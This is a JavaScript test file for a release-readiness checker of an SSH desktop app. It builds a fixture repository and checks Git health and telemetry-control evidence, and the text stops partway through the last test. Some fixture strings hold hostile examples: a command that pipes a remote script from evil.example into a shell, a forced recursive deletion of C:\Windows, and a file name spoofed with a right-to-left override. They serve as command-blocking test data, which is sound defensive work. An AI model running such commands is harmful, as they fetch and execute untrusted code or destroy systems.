import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import test from "node:test";

const CHECKER_PATH = fileURLToPath(
  new URL("./check-public-release-readiness.mjs", import.meta.url),
);
const ptyInputFixture = readFileSync(
  new URL("../apps/desktop/src-tauri/src/pty_input.rs", import.meta.url),
  "utf8",
);
const forwardingFixture = readFileSync(
  new URL("../apps/desktop/src/useForwardRules.ts", import.meta.url),
  "utf8",
);
const forwardingTestsFixture = readFileSync(
  new URL("../apps/desktop/src/useForwardRules.test.ts", import.meta.url),
  "utf8",
);
const releaseScriptNames = [
  "qa",
  "qa:release:public",
  "qa:release:public:local",
  "qa:prod-audit",
  "test:dependency-risk-register",
  "qa:lighthouse",
  "test:lighthouse-audit",
  "qa:lighthouse-audit",
  "qa:rust-advisory",
  "qa:web-admin-proxy-smoke",
  "qa:web-admin-sync-topology-smoke",
  "qa:web-admin-sync-topology-release-smoke",
  "qa:e2e",
  "qa:e2e:fresh",
  "qa:e2e:web-real-sync",
  "qa:e2e:web-real-sync:fresh",
  "qa:sync:backup-restore-smoke",
  "qa:sync:config-guard-smoke",
  "qa:sync:self-hosted-smoke",
  "qa:sync:release-smoke",
  "qa:tauri",
  "test:desktop-release-package",
  "qa:desktop-release-package",
  "test:desktop-release-evidence",
  "qa:desktop-release-evidence",
  "test:desktop-candidate-stage",
  "qa:desktop-candidate-stage",
  "test:web-release",
  "qa:web-release",
  "test:release-sbom",
  "test:release-publish-preflight",
  "test:release-provenance",
  "test:release-readiness",
  "test:web-admin-bundle-token-scan",
  "test:mobile-public-env",
  "test:sync-release-package",
  "test:sync-release-evidence",
  "test:web-release-verify",
  "qa:release-sbom",
  "qa:release-publish-preflight",
  "qa:release-provenance",
  "qa:release-readiness",
  "qa:web-admin-bundle-token-scan",
  "qa:mobile-public-env",
  "qa:sync-release-package",
  "qa:sync-release-evidence",
  "qa:sync:release-backup-restore-smoke",
  "release:desktop:build",
  "release:desktop:package",
  "release:desktop:checksums",
  "release:desktop:verify-evidence",
  "release:desktop:verify-candidate",
  "release:desktop:draft",
  "release:publish-preflight",
  "release:provenance",
  "release:provenance:verify",
  "release:verify-checksums",
  "release:sbom",
  "release:sbom:verify",
  "release:sync",
  "release:web",
];

function fixtureScriptValue(name, overrides = {}) {
  if (Object.hasOwn(overrides, name)) {
    return overrides[name];
  }
  if (name === "qa:release:public" || name === "qa:release:public:local") {
    return "npm run qa:mobile-public-env && npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";
  }
  if (name === "qa:mobile-public-env") {
    return "npm run test:mobile-public-env && node scripts/check-mobile-public-env.mjs";
  }
  if (name === "qa:rust-advisory") {
    return "cargo audit --deny warnings && cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings";
  }
  if (name === "qa:prod-audit") {
    return "npm audit --audit-level=high && node scripts/check-dependency-risk-register.mjs";
  }
  if (name === "test:dependency-risk-register") {
    return "node --test scripts/check-dependency-risk-register.test.mjs";
  }
  if (name === "qa") {
    return "npm run lint && npm run qa:lighthouse-audit && npm run qa:e2e:fresh";
  }
  if (name === "release:desktop:checksums") {
    return "npm run release:desktop:package";
  }
  if (name === "release:desktop:package") {
    return "node scripts/package-desktop-release.mjs --require-platforms windows,macos,linux";
  }
  if (name === "release:desktop:verify-candidate") {
    return "node scripts/verify-desktop-candidate.mjs";
  }
  if (name === "release:verify-checksums") {
    return "node scripts/verify-artifact-checksums.mjs --all-release";
  }
  if (name === "release:provenance") {
    return "node scripts/generate-release-provenance.mjs";
  }
  if (name === "release:provenance:verify") {
    return "node scripts/verify-release-provenance.mjs";
  }
  return "echo ok";
}

function createFixture(t, overrides = {}) {
  const root = mkdtempSync(join(tmpdir(), "public-readiness-"));
  t.after(() => {
    rmSync(root, { recursive: true, force: true });
  });

  const files = {
    "package.json": JSON.stringify({
      version: "0.1.0-beta.1",
      scripts: Object.fromEntries(
        releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
      ),
    }),
    "apps/desktop/package.json": JSON.stringify({ version: "0.1.0-beta.1" }),
    "apps/web/package.json": JSON.stringify({ version: "0.1.0-beta.1" }),
    "apps/mobile/package.json": JSON.stringify({ version: "0.1.0-beta.1" }),
    "apps/mobile/app.json": JSON.stringify({
      expo: { version: "0.1.0-beta.1" },
    }),
    "Cargo.toml": 'version = "0.1.0-beta.1"\n',
    "crates/core/Cargo.toml":
      'russh = { version = "0.61", default-features = false, features = ["ring", "flate2"] }\n',
    "services/sync/Cargo.toml":
      'version = "0.1.0-beta.1"\ndescription = "JoeSSH sync service API"\n',
    "apps/desktop/src-tauri/Cargo.toml": 'version = "0.1.0-beta.1"\n',
    "apps/desktop/src-tauri/tauri.conf.json": JSON.stringify({
      productName: "JoeSSH",
      version: "0.1.0-beta.1",
      identifier: "dev.atlasterm.joessh",
      bundle: {
        active: true,
        targets: "all",
        icon: ["icons/icon.png", "icons/icon.ico", "icons/icon.icns"],
        windows: {
          wix: {
            version: "0.1.0.1",
            upgradeCode: "c2a51a19-3ad8-5494-8c3e-6eb5d2e3e748",
          },
        },
      },
      app: { windows: [{ label: "main" }] },
    }),
    "apps/desktop/src-tauri/icons/icon.png": "png icon fixture",
    "apps/desktop/src-tauri/icons/icon.ico": "ico icon fixture",
    "apps/desktop/src-tauri/icons/icon.icns": "icns icon fixture",
    ".github/workflows/ci.yml": ciFixture(),
    ".github/workflows/desktop-candidates.yml":
      "git rev-parse HEAD\nstage-desktop-candidate.mjs --source-commit\nrelease:desktop:verify-candidate --source-commit\nactions/upload-artifact\n",
    ".github/workflows/dependabot-auto-merge.yml":
      "dependency-type\ndirect:development\n",
    "scripts/verify-desktop-release-evidence.mjs":
      "sha256File(fullPath) hash mismatch artifact.sha256 sha256 must match release-evidence-SHA256SUMS.txt missing desktop evidence checksum manifest desktop evidence checksum manifest hash mismatch must mention the artifact path, artifact file name, or artifact sha256\n",
    "scripts/verify-desktop-release-evidence.test.mjs": "",
    "scripts/package-desktop-release.mjs":
      "artifactSha256 sha256: artifactSha256\n",
    "scripts/check-dependency-risk-register.mjs": "",
    "scripts/check-dependency-risk-register.test.mjs": "",
    "scripts/package-desktop-release.test.mjs": "",
    "scripts/stage-desktop-candidate.mjs":
      "--source-commit cannot overlap Desktop bundle directory\n",
    "scripts/stage-desktop-candidate.test.mjs": "",
    "scripts/verify-desktop-candidate.mjs":
      "releaseEligible signingStatus sourceCommit --standalone SHA256SUMS.txt candidate metadata does not list file\n",
    "scripts/verify-desktop-candidate.test.mjs": "",
    "scripts/desktop-candidate-workflow.test.mjs": "",
    "scripts/package-sync-release.mjs":
      "removeStaleSyncReleaseBinaries isSyncReleaseBinaryName SHA256SUMS.txt\n",
    "scripts/package-sync-release.test.mjs": "",
    "scripts/verify-sync-release-evidence.mjs": "",
    "scripts/verify-sync-release-evidence.test.mjs": "",
    "scripts/package-web-release.mjs":
      "isInsideRoot(outputPath) isInsideRoot(checksumPath) Web Admin release output paths must stay inside the release root\n",
    "scripts/package-web-release.test.mjs": "",
    "scripts/verify-web-release-package.mjs": "",
    "scripts/verify-web-release-package.test.mjs": "",
    "scripts/check-web-admin-bundle-token-scan.mjs":
      "ATLASTERM_[A-Z0-9_]*TOKEN bearer token literal high-entropy credential literal\n",
    "scripts/check-web-admin-bundle-token-scan.test.mjs": "",
    "scripts/check-mobile-public-env.mjs":
      "EXPO_PUBLIC_ATLASTERM_SYNC_AUTH_TOKEN Public Beta mobile release builds embedded in the app bundle\n",
    "scripts/check-mobile-public-env.test.mjs": "",
    "scripts/lighthouse-audit.mjs":
      '"web" apps", "web", "dist reports", "lighthouse", "web-admin.json --min-performance defaultThresholds readDeploymentHeaders ?adminSnapshot=fixture /api/admin/snapshot createEmptyAdminSnapshot collectRunWarningFailures runWarnings\n',
    "scripts/smoke-web-admin-proxy.mjs":
      "assertPublicBindFailsClosed assertPublicBindRequiresOperatorToken assertPublicBindRequiresOperatorAuthorization ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND=1 assertInvalidMaxBytesConfigFails assertProxyRejectsOversizedSnapshot upstream_snapshot_too_large\n",
    "scripts/smoke-web-admin-sync-release-topology.mjs":
      "assertWebDist startStaticReleaseServer node-admin-snapshot-proxy.mjs ATLASTERM_SYNC_CORS_ORIGINS assertTopologyEmptySnapshot seedSyncData /v1/devices/register /v1/sync/push assertTopologyPopulatedSnapshot activeMembers healthyDevices assertProxyReplacesBrowserAuthorization assertTopologyAdminTokenError --packaged-release package-sync-release.mjs verify-artifact-checksums.mjs reports/release/sync/SHA256SUMS.txt joessh-sync-${version}-${process.platform}-${process.arch}\n",
    "scripts/smoke-sync-backup-restore.mjs":
      '--packaged-release binaryKind binarySha256 binaryManifest "reports", "release", "sync" "reports", "smoke", "sync" evidenceDirectory\n',
    "scripts/smoke-sync-config-guard.mjs": "",
    "scripts/verify-release-sbom.mjs": "",
    "scripts/verify-release-sbom.test.mjs": "",
    "scripts/generate-release-provenance.mjs":
      'gitFsckStrict ["remote", "get-url", "origin"] release-provenance-SHA256SUMS.txt checksumManifests requiredChecksumManifests reports/release/desktop/release-evidence-SHA256SUMS.txt reports/release/sync/backup-restore-smoke-SHA256SUMS.txt\n',
    "scripts/verify-release-provenance.mjs":
      "source.repository git fsck --strict release notes hash mismatch artifact hash mismatch requiredChecksumManifests unexpected Public Beta checksum manifest is staged\n",
    "scripts/verify-release-provenance.test.mjs": "",
    "scripts/release-publish-preflight.mjs":
      'Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release verify-release-provenance.mjs Verify GitHub CLI publish readiness ATLASTERM_RELEASE_GH_COMMAND auth", "status release", "view", releaseTag already exists; refusing to publish a duplicate release\n',
    "scripts/release-publish-preflight.test.mjs": "",
    "scripts/create-github-release-draft.mjs":
      'collectFiles(resolve(root, "reports", "release"))\nprovenanceVerificationArgs\nif (dryRun)\nprovenanceVerificationArgs.push("--skip-current-git-check")\n',
    "scripts/create-github-release-draft.test.mjs":
      "non-dry-run rejects release provenance from a different Git source\n",
    "apps/desktop/src-tauri/capabilities/main.json": JSON.stringify({
      identifier: "main",
      local: true,
      windows: ["main"],
      permissions: ["allow-open-session"],
    }),
    "apps/desktop/src-tauri/permissions/app-commands.toml":
      '[[permission]]\nidentifier = "allow-open-session"\ncommands.allow = ["open_session"]\n',
    "apps/desktop/src-tauri/src/lib.rs": [
      "tauri::Builder::default().invoke_handler(tauri::generate_handler![open_session]);",
      "// ssh_host_key_probe enum HostKeyProbeStatus struct KnownHostRecord struct KnownHostsFile",
      "// known_hosts_list known_hosts_remove KnownHostSource::Legacy KnownHostSource::Tofu KnownHostSource::Confirmed",
      "// SFTP_MAX_TRANSFER_BYTES SFTP_TRANSFER_LIMIT_EXCEEDED download_limited(&path, SFTP_MAX_TRANSFER_BYTES) sanitize_sftp_transfer_error ensure_sftp_transfer_size(data.len()) sftp_transfer_errors_use_sftp_limit_copy sftp_transfer_size_guard_rejects_oversized_payloads",
      "// OutputLimitExceeded command output exceeded desktop safety limit",
      "// SSH_EXEC_COMMAND_BLOCKED ensure_safe_ssh_exec_command(&command) detect_dangerous_command(command) DangerousCommandAction::Block ssh_exec_native_safety_blocks_destructive_commands",
      nativePtyShellFixture(),
    ].join("\n"),
    "apps/desktop/src-tauri/src/pty_input.rs": ptyInputFixture,
    "crates/core/src/ssh.rs":
      'pub async fn probe_host_key() { let policy = HostKeyPolicy::AcceptAny; handle.disconnect(russh::Disconnect::ByApplication, "", ""); }\nSSH_EXEC_MAX_OUTPUT_BYTES\nOutputLimitExceeded\nexec_output_would_exceed_limit\nexec_output_limit_allows_boundary_and_rejects_growth\nis_safe_sftp_entry_name\nUNSAFE_SFTP_ENTRY_FORMAT_RANGES\nfilter_map(|entry|\nsftp_entry_name_guard_rejects_paths_and_control_characters\nsafe\\u{202e}cod.exe\n',
    "crates/core/tests/core_tests.rs":
      "detects_native_ipc_command_safety_block_patterns\ncurl https://evil.example/install.sh | sh\nRemove-Item -Recurse -Force C:\\\\Windows\n",
    "apps/desktop/src/ipc.ts":
      "export function sshHostKeyProbe() {} export function knownHostsList() {} export function knownHostsRemove() {} export interface KnownHostEntry {}\n",
    "apps/desktop/src/ConnectModal.tsx":
      "onHostKeyProbe pendingHostKey desktop.hostKeyConfirmTitle desktop.trustHostKeyAndConnect desktop.hostKeyChangedDetail\n",
    "apps/desktop/src/ConnectModal.test.tsx":
      "requires confirmation for an unknown host key before authenticating\nblocks authentication when the stored host key changed\ncontinues directly when the stored host key matches\n",
    "apps/desktop/src/sftpRemotePath.ts":
      "normalizeSftpRemotePath\njoinSftpRemotePath\nisSafeSftpEntryName\njoinSftpRemoteEntryPath\nUNSAFE_ENTRY_NAME_PATTERN\nparentSftpRemotePath\n",
    "apps/desktop/src/useSftpDirectory.test.ts":
      "joinSftpRemotePath builds stable file payload paths\nvalidates SFTP listing entry names before using them as path segments\njoinSftpRemoteEntryPath refuses names that escape the current directory\nnormalizes opened paths before reloading\nfile name #1.txt\n",
    "apps/desktop/src/useSftpTransfer.ts":
      "SFTP_TRANSFER_MAX_BYTES\nknownSizeBytes\nrejectTooLarge\ndata.length > maxBytes\n",
    "apps/desktop/src/useSftpTransfer.test.ts":
      "rejects downloads with known sizes over the transfer limit before reading\nrejects downloaded payloads over the transfer limit\nrejects upload payloads over the transfer limit before writing\n",
    "apps/desktop/src/useForwardRules.ts": forwardingFixture,
    "apps/desktop/src/useForwardRules.test.ts": forwardingTestsFixture,
    "apps/desktop/src/panels.tsx":
      "knownHosts.entries knownHosts.onRemove desktop.knownHostFirstSeen desktop.knownHostLastSeen desktop.removeKnownHost desktop.confirmKnownHostRemove desktop.confirmKnownHostsClear pendingKnownHostAction\npendingUploadFile desktop.sftpOverwriteTitle desktop.sftpOverwriteDetail desktop.sftpOverwriteConfirm desktop.sftpOverwriteCancel transfer?.onUpload(pendingUploadFile)\nconst isPending = Boolean(rt?.pending)\ndisabled={!forwards || isPending}\n",
    "apps/desktop/src/panels.test.tsx":
      "lists known-host pins with audit metadata and confirms before removing one pin\nshows the stored known-host count and confirms before clearing them\nSHA256:abc\nRemove host key\nrequires confirmation before overwriting an existing SFTP file\nReplace existing file?\nA file named app.log already exists in this folder.\nOverwrite\ndisables forwarding controls while a start or stop action is pending\npending: true\n",
    "apps/desktop/src/usePtySession.ts":
      "export type PtyStatus\nexitCode\nsetExitCode(code)\nblockedReason\nptyCommandBlockedReason\nresize: (ptyId: string, cols: number, rows: number) => Promise<void>\n",
    "apps/desktop/src/XtermTerminal.tsx":
      'ResizeObserver\nmeasureTerminalDimensions\nterm.resize(next.cols, next.rows)\nresize(next.cols, next.rows)\nstatusLabels.reconnect\nstatusLabels.blocked\nrole={pty.blockedReason !== null ? "alert" : "status"}\nTerminal exited\n',
    "apps/desktop/src/XtermTerminal.test.tsx":
      "resizes the existing terminal and PTY when the container changes size\nshows exit status and reconnects the PTY without rebuilding xterm\nshows native PTY command blocks as an assertive status without closing the terminal\nfirst.deps.open).toHaveBeenCalledTimes(2)\n",
    "apps/desktop/src/usePtySession.test.ts":
      "moves to closed when the pty emits exit\nresult.current.exitCode\nforwards write and resize to the open pty\nsurfaces native PTY command blocks and clears them after a safe write\n",
    "docs/release-checklist.md":
      "Public Beta docs/repository-release-handoff.md SBOM SHA256 SBOM-SHA256SUMS.txt release-evidence.json release-evidence-SHA256SUMS.txt release-provenance.json release-provenance-SHA256SUMS.txt artifact sha256 manifest hash staged cargo-audit qa:rust-advisory qa:lighthouse release:publish-preflight backup-restore-smoke.json qa:sync:backup-restore-smoke unknown-host fingerprint changed-host-key blocking per-host known host removal runtime telemetry rollback\n",
    "docs/repository-release-handoff.md":
      "healthy Git checkout do not publish from the damaged workspace git status --short git fsck --strict git diff --binary release-provenance.json npm run qa:release:public node scripts/check-public-release-readiness.mjs v0.1.0-beta.1\n",
    "docs/release-notes/0.1.0-beta.1.md":
      "JoeSSH 0.1.0-beta.1 Desktop Web Admin Sync Service SHA256 release:publish-preflight\n",
    "docs/desktop-release-metadata.json": JSON.stringify({
      productName: "JoeSSH",
      identifier: "dev.atlasterm.joessh",
      publisher: "JoeSSH Project",
      copyright: "Copyright (c) 2026 JoeSSH contributors",
      category: "Developer Tools",
      bundleTargets: ["windows", "macos", "linux"],
      signingEvidence: {
        windows: "ATLASTERM_DESKTOP_WINDOWS_SIGNATURE_VERIFICATION",
        macosSignature: "ATLASTERM_DESKTOP_MACOS_SIGNATURE_VERIFICATION",
        macosNotarization: "ATLASTERM_DESKTOP_MACOS_NOTARIZATION_VERIFICATION",
      },
      linuxPackageTypes: ["AppImage", "deb", "rpm"],
    }),
    "docs/desktop-distribution.md":
      "Windows sign notarization Linux release-evidence.json release-evidence-SHA256SUMS.txt artifact sha256 manifest hash staged desktop-release-metadata.json capabilities permissions pre-auth host-key probe known-host list/remove/clear unknown hosts require a visible fingerprint confirmation changed host keys are blocked first/last seen metadata 1 MiB 25 MiB bounded SFTP transfer\n",
    "docs/web-admin-deployment.md":
      "The public root path defaults to live Web Admin. _headers CSP VITE_ATLASTERM_ADMIN_SNAPSHOT_URL joessh-web-admin verify-web-release-package.mjs .well-known/security.txt node-admin-snapshot-proxy.mjs ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN ATLASTERM_ADMIN_SNAPSHOT_PROXY_MAX_BYTES upstream_snapshot_too_large 1 MiB qa:web-admin-proxy-smoke qa:lighthouse qa:web-admin-sync-topology-smoke qa:web-admin-sync-topology-release-smoke ?adminSnapshot=fixture\n",
    "docs/self-hosting-sync.md":
      "ATLASTERM_SYNC_AUTH_TOKEN ATLASTERM_SYNC_METRICS_TOKEN ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE 32 characters /readyz /metrics schema_version: 1 qa:sync:config-guard-smoke ledger.lock joessh_sync_storage_write_failures_total qa:sync:backup-restore-smoke RPO RTO systemd Docker HEALTHCHECK Authorization: Bearer ${ATLASTERM_SYNC_METRICS_TOKEN} qa:sync-release-package qa:sync:release-smoke\n",
    "docs/dependency-risk-register.md": dependencyRiskFixture(),
    "docs/privacy-public-beta.md": privacyFixture(),
    "deploy/web-admin/node-admin-snapshot-proxy.mjs":
      "ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN isAuthorizedBearer timingSafeEqual isLoopbackHost ATLASTERM_ADMIN_SNAPSHOT_PROXY_MAX_BYTES readUpstreamTextWithLimit content-length upstream_snapshot_too_large UpstreamSnapshotTooLargeError\n",
    "services/sync/Dockerfile":
      'ENV ATLASTERM_SYNC_STORAGE_PATH=/var/lib/joessh-sync/ledger.json\nVOLUME ["/var/lib/joessh-sync"]\nHEALTHCHECK CMD curl -fsS "http://127.0.0.1:${ATLASTERM_SYNC_HEALTHCHECK_PORT:-4100}/healthz" || exit 1\n',
    "services/sync/joessh-sync.service.example": "",
    "CHANGELOG.md": "[0.1.0-beta.1]\n",
    "README.md": "# JoeSSH\nWeb Admin console\nnpm run qa:prod-audit\n",
    ".env.example":
      "# JoeSSH Environment Variables\npublic mobile beta builds\nATLASTERM_SYNC_METRICS_TOKEN\nATLASTERM_SYNC_STORAGE_PATH\nATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE\n",
    LICENSE: "Copyright (c) 2026 JoeSSH contributors\n",
    "ARCHITECTURE.md": "Security gate: npm run qa:prod-audit\n",
    "apps/desktop/public/llms.txt":
      "# JoeSSH Workbench\n\nJoeSSH is a local-first remote workbench.\n",
    "apps/desktop/public/humans.txt": "JoeSSH Team\n",
    "apps/desktop/public/sw.js": 'const CACHE_NAME = "joessh-v1";\n',
    "apps/web/public/humans.txt": "JoeSSH Team\n",
    "apps/web/public/sw.js": "const CACHE_NAME = 'joessh-admin-v1';\n",
    "packages/error-monitor/src/index.ts": errorMonitorRuntimeFixture(),
    "packages/error-monitor/src/index.test.ts":
      runtimeDisableTestFixture("error monitor"),
    "apps/desktop/src/main.tsx": `${appShellFixture("desktop")}\nSFTP_TRANSFER_MAX_BYTES\ndesktop.sftpTransferTooLarge\nknownSizeBytes: size\nfile.size > SFTP_TRANSFER_MAX_BYTES\njoinSftpRemoteEntryPath(sftpDirectory.path, name)\njoinSftpRemoteEntryPath(sftpDirectory.path, file.name)\n`,
    "apps/desktop/src/main.test.tsx":
      runtimeDisableTestFixture("desktop shell"),
    "apps/web/src/main.tsx": appShellFixture("web"),
    "apps/web/src/main.test.ts": runtimeDisableTestFixture("web shell"),
    "apps/web/src/adminData.ts":
      "const params = new URLSearchParams(search);\nreturn params.get('adminSnapshot') === 'fixture' ? 'fixture' : 'live';\nexport function getAdminSnapshotSourceDescriptor() { return { mode: 'live', snapshotUrl: '/api/admin/snapshot', source: 'live' }; }\nconst fixtureDescriptor = { mode: 'fixture', snapshotUrl: null, source: 'fixture' };\nADMIN_SNAPSHOT_MAX_BYTES readResponseJsonWithLimit content-length response.body.getReader Admin snapshot response was too large.\n",
    "apps/web/src/adminData.test.ts":
      "getAdminSnapshotSourceDescriptor('?adminSnapshot=fixture')\ngetAdminSnapshotSourceDescriptor('?adminSnapshot=live')\noversized admin snapshot content-length\noversized streaming admin snapshot bodies\nAdmin snapshot response was too large.\n",
    "apps/web/src/localization.ts":
      'const commonMessages = { "web.snapshot.status": "Snapshot status", "web.snapshot.health.ready": "Healthy", "web.snapshot.health.error": "Unhealthy" };\nreturn localMessages[locale][key] ?? commonMessages[key];\n',
    "apps/web/src/localization.test.ts":
      "web.snapshot.lastRefreshed\nweb.snapshot.health.ready\n",
    ...overrides,
  };

  for (const [path, content] of Object.entries(files)) {
    writeFile(root, path, content);
  }

  return root;
}

function writeFile(root, relativePath, content) {
  const path = join(root, ...relativePath.split("/"));
  mkdirSync(join(path, ".."), { recursive: true });
  writeFileSync(path, content, "utf8");
}

function runChecker(root, allowUnhealthyGit = true) {
  return spawnSync(
    process.execPath,
    [CHECKER_PATH, "--root", root, ...(allowUnhealthyGit ? ["--allow-unhealthy-git"] : [])],
    {
      encoding: "utf8",
    },
  );
}

function ciFixture() {
  return [
    "npm run qa:artifact-checksums",
    "npm run qa:desktop-release-package",
    "npm run qa:desktop-release-evidence",
    "npm run qa:desktop-candidate-stage",
    "npm run qa:sync-release-package",
    "npm run qa:sync-release-evidence",
    "npm run qa:web-release",
    "npm run qa:release-sbom",
    "npm run qa:release-draft",
    "npm run qa:release-publish-preflight",
    "npm run qa:release-provenance",
    "npm run qa:lighthouse-audit",
    "npm run test:web-admin-bundle-token-scan",
    "npm run qa:e2e:web-real-sync:fresh",
    "npm run qa:e2e:visual:fresh",
    "npm run qa:prod-audit",
    "      - run: npm run test:dependency-risk-register",
    "npm run qa:lighthouse",
    "npm run qa:tauri",
    "npm run qa:mobile:native-preflight",
    "npm run qa:mobile-public-env",
    "cargo install cargo-audit --locked",
    "npm run release:sbom",
    "npm run release:sbom:verify",
    "npm run qa:e2e:fresh",
    "npm run qa:web-admin-proxy-smoke",
    "npm run qa:web-admin-bundle-token-scan",
    "npm run qa:web-admin-sync-topology-release-smoke",
    "npm run qa:sync:self-hosted-smoke",
    "npm run qa:sync:release-smoke",
    "npm run qa:sync:release-backup-restore-smoke",
    "npm run qa:sync:config-guard-smoke",
    "npm run qa:sync:backup-restore-smoke",
    "node scripts/verify-sync-release-evidence.mjs",
    "node scripts/check-public-release-readiness.mjs",
    "  rust:",
    "    steps:",
    "      - run: cargo audit --deny warnings",
    "      - run: cargo audit --file apps/desktop/src-tauri/Cargo.lock --deny warnings",
  ].join("\n");
}

function dependencyRiskFixture() {
  return [
    "# Dependency Risk Register",
    "High or critical findings in the full npm audit block release.",
    "Both Rust lockfiles must pass `cargo audit --deny warnings`.",
    "## Unresolved npm findings",
    "| Origin | Advisory | Impact and decision | Owner and next action |",
    "| --- | --- | --- | --- |",
    "| example-dependency | https://github.com/advisories/GHSA-aaaa-bbbb-cccc | Resource exhaustion; release blocked. | Release maintainers: adopt a supported fix. |",
    "## RustSec",
    "| Package | Advisory | Decision and follow-up |",
    "| --- | --- | --- |",
    "| example-crate | https://rustsec.org/advisories/RUSTSEC-2099-0001.html | Release maintainers must adopt a supported fix before release. |",
  ].join("\n");
}

function privacyFixture() {
  return [
    "JoeSSH Public Beta telemetry is opt-in.",
    "SSH host username command path file name private key token terminal output",
    "Runtime Control Evidence",
    "The release readiness gate requires runtime telemetry off implementation evidence.",
    "The code must retain install cleanup and stop new network submissions immediately.",
  ].join("\n");
}

function errorMonitorRuntimeFixture() {
  return `
let telemetryEnabled = true;
const queue = [];
let installCleanup;

export function setTelemetryEnabled(value) {
  telemetryEnabled = value;
  if (!telemetryEnabled) {
    queue.splice(0, queue.length);
    installCleanup?.();
  }
}

export function createErrorMonitor() {
  function report(message) {
    if (!telemetryEnabled) return;
    queue.push(message);
  }

  function flush() {
    if (!telemetryEnabled) return;
    fetch("/telemetry");
  }

  function install() {
    const timer = setInterval(flush, 1000);
    window.addEventListener("error", report);
    installCleanup = () => {
      window.removeEventListener("error", report);
      clearInterval(timer);
    };
    return installCleanup;
  }

  return { report, flush, install, setTelemetryEnabled, disable: () => setTelemetryEnabled(false) };
}
`;
}

function nativePtyShellFixture() {
  return `
mod pty_input;
use pty_input::{apply_pty_input_safety, PtyInputState};

async fn pty_write(state: tauri::State<'_, AppState>, pty_id: String, data: Vec<u8>) -> Result<(), String> {
    let id = parse_id(&pty_id)?;
    let ptys = state.ptys.lock().await;
    let writer = ptys.get(&id).ok_or_else(|| "pty not found".to_string())?;
    if let Err(error) = ensure_safe_pty_write(&state, id, &data).await {
        let _ = writer.value.write(&[0x03]).await;
        return Err(error);
    }
    writer.value.write(&data).await.map_err(sanitize_ssh_error)
}

async fn ensure_safe_pty_write(state: &tauri::State<'_, AppState>, pty_id: Uuid, data: &[u8]) -> Result<(), String> {
    let mut buffers = state.pty_input_buffers.lock().await;
    let input_state = buffers.entry(pty_id).or_default();
    apply_pty_input_safety(input_state, data)
}
`;
}

function appShellFixture(name) {
  return `
import { createErrorMonitor, createNoopErrorMonitor } from "@atlasterm/error-monitor";

const env = import.meta.env;
const telemetryConsent = localStorage.getItem("${name}:telemetryConsent");
const monitor = env.VITE_ATLASTERM_TELEMETRY_OPT_IN === "1" && telemetryConsent === "enabled"
  ? createErrorMonitor({ app: "${name}", version: "0.1.0-beta.1" })
  : createNoopErrorMonitor();
let telemetryCleanup = monitor.install();

window.addEventListener("storage", () => {
  telemetryCleanup?.();
  monitor.disable?.();
});

const snapshotOpsSurface = "snapshotStatus web.snapshot.lastRefreshed web.snapshot.lastSuccess getDashboardLastSuccess dashboardStateRef";
`;
}

function runtimeDisableTestFixture(name) {
  return `
it("${name} runtime telemetry disable/off cleans up transport and stops new network submissions", () => {
  const fetch = vi.fn();
  expect(fetch).not.toHaveBeenCalled();
});
`;
}

test("accepts release readiness when runtime telemetry control evidence is present", (t) => {
  const result = runChecker(createFixture(t));

  assert.equal(result.status, 0, result.stdout + result.stderr);
  assert.match(result.stdout, /Public Beta release readiness checks passed/);
});

function runFixtureGit(root, args) {
  const result = spawnSync("git", args, { cwd: root, encoding: "utf8" });
  assert.equal(result.status, 0, result.stdout + result.stderr);
  return result.stdout.trim();
}

function commitFixture(root) {
  runFixtureGit(root, ["init", "--quiet"]);
  runFixtureGit(root, ["add", "package.json"]);
  runFixtureGit(root, [
    "-c", "user.name=Readiness fixture", "-c", "user.email=fixture@example.invalid",
    "-c", "core.hooksPath=.fixture-no-hooks", "-c", "commit.gpgsign=false",
    "commit", "--quiet", "-m", "Fixture baseline",
  ]);
}

test("release readiness rejects an empty Git repository", (t) => {
  const root = createFixture(t);
  runFixtureGit(root, ["init", "--quiet"]);
  const result = runChecker(root, false);
  assert.equal(result.status, 1, result.stdout + result.stderr);
  assert.match(result.stdout, /FAIL Git checkout metadata is healthy/);
});

test("release readiness accepts complete Git objects", (t) => {
  const root = createFixture(t);
  commitFixture(root);
  const result = runChecker(root, false);
  assert.equal(result.status, 0, result.stdout + result.stderr);
  assert.match(result.stdout, /PASS Git checkout metadata is healthy/);
});

test("release readiness rejects a missing tracked Git object", (t) => {
  const root = createFixture(t);
  commitFixture(root);
  const blob = runFixtureGit(root, ["rev-parse", "HEAD:package.json"]);
  rmSync(join(root, ".git", "objects", blob.slice(0, 2), blob.slice(2)));
  const result = runChecker(root, false);
  assert.equal(result.status, 1, result.stdout + result.stderr);
  assert.match(result.stdout, /FAIL Git checkout metadata is healthy/);
});

test("rejects missing error-monitor runtime telemetry disable implementation evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "packages/error-monitor/src/index.ts":
        "export function createErrorMonitor() { return { report() {}, flush() {}, install() {} }; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Error monitor exposes runtime telemetry disable\/consent control/,
  );
  assert.match(
    result.stdout,
    /FAIL Error monitor clears pending telemetry when runtime telemetry is disabled/,
  );
});

test("rejects missing app-shell runtime telemetry off test evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/main.test.ts":
        "it('keeps telemetry default-off', () => {});\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web app shell tests cover runtime telemetry off/,
  );
